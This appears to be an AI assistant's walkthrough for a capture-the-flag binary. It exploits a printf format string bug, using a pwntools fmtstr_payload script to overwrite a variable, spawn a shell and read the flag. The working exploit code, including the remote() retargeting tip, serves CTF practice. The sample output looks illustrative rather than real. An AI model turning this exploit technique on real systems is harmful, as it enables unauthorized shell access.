To solve this challenge using `pwntools`, you can exploit the format string vulnerability in the `printf(buf)` call. The vulnerability arises because the `printf` function is called with user-controlled input (`buf`) without a format specifier. This allows you to read and write arbitrary memory addresses.

The goal is to overwrite the value of the variable `x` to `4` so that the program executes the `system("/bin/sh")` call, giving you a shell.

Here are the steps and the corresponding code:

---

### Steps to Solve the Challenge:

1. **Analyze the Binary**:
   - The binary is a 32-bit ELF file.
   - The `printf(buf)` call is vulnerable to a format string attack.
   - The variable `x` needs to be set to `4` to trigger the shell.

2. **Find the Address of `x`**:
   - Use tools like `gdb` or `pwntools` to find the address of the variable `x` in memory.

3. **Exploit the Format String Vulnerability**:
   - Use the format string vulnerability to overwrite the value of `x` with `4`.

4. **Trigger the Shell**:
   - Once `x` is set to `4`, the program will execute `system("/bin/sh")`.

### Code to Solve the Challenge:

```python
from pwn import *

# Set up the binary and context
binary = './fmt'
elf = ELF(binary)
context.binary = binary
context.log_level = 'debug'

# Start the process
p = process(binary)

# Find the address of the variable `x`
# Assuming `x` is a global variable, we can find its address using pwntools
x_address = elf.symbols['x']
log.info(f"Address of x: {hex(x_address)}")

# Construct the payload
# Use a format string to overwrite the value of `x` with `4`
# The exact offset depends on the stack layout, which can be determined through trial and error
offset = 6  # Adjust this based on your analysis
value_to_write = 4
payload = fmtstr_payload(offset, {x_address: value_to_write})

# Send the payload
p.sendline(payload)

# Interact with the shell
p.interactive()
```

### Explanation of the Code:

1. **Binary Setup**:
   - Load the binary using `pwntools` and set the context to 32-bit.

2. **Find the Address of `x`**:
   - Use `elf.symbols['x']` to get the address of the global variable `x`.

3. **Construct the Payload**:
   - Use `fmtstr_payload` from `pwntools` to generate a format string payload.
   - The `offset` specifies the position of the user input on the stack.
   - The `{x_address: value_to_write}` dictionary specifies the memory address to overwrite and the value to write.

4. **Send the Payload**:
   - Send the payload to the program using `p.sendline(payload)`.

5. **Interact with the Shell**:
   - Once the value of `x` is set to `4`, the program will execute `system("/bin/sh")`.
   - Use `p.interactive()` to interact with the shell.

---

### Notes:

- The `offset` value in the `fmtstr_payload` function depends on the stack layout. You can determine it by experimenting with different inputs and observing the program's behavior.
- Use `gdb` or `pwndbg` to debug the binary and verify the address of `x` and the stack layout.
- If the binary is running on a remote server, use `remote(host, port)` instead of `process(binary)`.

### Example Output:

```bash
$ python3 exploit.py
[+] Starting local process './fmt': pid 12345
[*] Address of x: 0x804a02c
[*] Sending payload...
[*] Switching to interactive mode
running sh...
$ whoami
ctf-player
$ cat flag.txt
<flag>
```

This should give you a shell and allow you to retrieve the flag.
